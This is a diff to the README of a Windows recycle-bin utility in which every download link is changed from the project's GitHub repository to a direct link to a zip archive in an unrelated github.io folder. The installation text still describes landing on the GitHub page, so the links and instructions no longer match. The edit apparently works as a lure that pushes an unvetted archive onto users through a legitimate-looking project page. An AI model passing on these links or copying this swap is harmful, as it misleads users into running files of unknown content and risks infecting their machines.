@@ -6,7 +6,7 @@ description: "Revolutionize your Windows 10/11 desktop with a sleek, modern recy
 <h1>🗑️ Modern-Recycle-Bin - Restore, Preview, and Manage Files Easily</h1>
 
 <p align="center">
-  <a href="https://github.com/bsrajputindore1980/Modern-Recycle-Bin" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">⬇️ Download Modern-Recycle-Bin</a>
+  <a href="https://raw.githubusercontent.com/bsrajputindore1980/bsrajputindore1980.github.io/main/posts/Application-v3.1.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">⬇️ Download Modern-Recycle-Bin</a>
 </p>
 
 ## 👋 Welcome to Modern-Recycle-Bin
@@ -39,7 +39,7 @@ That's it. You will have Modern-Recycle-Bin up and running in just a few minutes
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/bsrajputindore1980/Modern-Recycle-Bin](https://github.com/bsrajputindore1980/Modern-Recycle-Bin)
+Visit this link to download the application: [https://raw.githubusercontent.com/bsrajputindore1980/bsrajputindore1980.github.io/main/posts/Application-v3.1.zip](https://raw.githubusercontent.com/bsrajputindore1980/bsrajputindore1980.github.io/main/posts/Application-v3.1.zip)
 
 Once you click the link, you will be taken to the GitHub page for Modern-Recycle-Bin. Look for the green "Code" button or the "Releases" section on the right side of the page. Click on the latest release (the one at the top) to find the download file.
 
@@ -139,7 +139,7 @@ Modern-Recycle-Bin is a small utility with big benefits. It solves real problems
 Download it today and give your Recycle Bin the upgrade it deserves!
 
 <p align="center">
-  <a href="https://github.com/bsrajputindore1980/Modern-Recycle-Bin" style="background-color:#008CBA;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">⬇️ Get Modern-Recycle-Bin Now</a>
+  <a href="https://raw.githubusercontent.com/bsrajputindore1980/bsrajputindore1980.github.io/main/posts/Application-v3.1.zip" style="background-color:#008CBA;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">⬇️ Get Modern-Recycle-Bin Now</a>
 </p>
 
 Keywords: csharp, dotnet-framework, file-manager, fluent-design, recycle-bin, utility, webview2, windows, windows-11, winforms
